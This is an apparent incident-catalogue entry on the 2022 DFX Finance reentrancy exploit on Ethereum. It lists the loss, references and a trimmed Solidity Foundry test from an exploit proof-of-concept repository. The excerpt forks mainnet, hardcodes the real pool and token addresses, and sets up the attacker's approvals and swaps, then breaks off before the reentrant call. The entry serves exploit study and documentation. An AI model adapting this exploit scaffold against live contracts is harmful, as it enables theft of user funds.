# [?] - DFXFinance - Reentrancy

## Summary
Severity: Unknown
Chain: Ethereum
Component: DFX
Published: 2022-11-10
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/DFX_exp.sol
Type: defi-exploit-poc

## Details
Lost: $4M
References:
- https://twitter.com/BlockSecTeam/status/1590960299246780417
- https://twitter.com/BeosinAlert/status/1591012525914861570
- https://twitter.com/AnciliaInc/status/1590839104731684865
- https://twitter.com/peckshield/status/1590831589004816384

```solidity
contract ContractTest is Test {
    IERC20 XIDR = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    Curve dfx = Curve(0x46161158b1947D9149E066d6d31AF1283b2d377C);
    uint256 receiption;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_941_703);
    }

    function testExploit() public {
        address(WETH).call{value: 2 ether}("");
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        USDC.approve(address(dfx), type(uint256).max);
        XIDR.approve(address(Router), type(uint256).max);
        XIDR.approve(address(dfx), type(uint256).max);

        WETHToUSDC();

        emit log_named_decimal_uint("[Before] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 6);

        USDCToXIDR();
        uint256[] memory XIDR_USDC = new uint256[](2);
        XIDR_USDC[0] = 0;
        XIDR_USDC[1] = 0;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/DFX_exp.sol_
